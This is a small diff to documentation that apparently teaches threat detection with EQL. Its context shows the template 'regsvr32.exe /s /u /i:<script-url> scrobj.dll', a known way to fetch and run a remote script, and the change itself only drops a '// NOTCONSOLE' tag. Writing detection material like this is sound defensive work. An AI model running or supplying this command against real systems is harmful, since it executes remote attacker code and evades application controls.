@@ -28,7 +28,6 @@ register and run a remote script. These commands often look like this:
 ----
 "regsvr32.exe  /s /u /i:<script-url> scrobj.dll"
 ----
-// NOTCONSOLE
 
 [discrete]
 [[eql-ex-threat-detection-setup]]
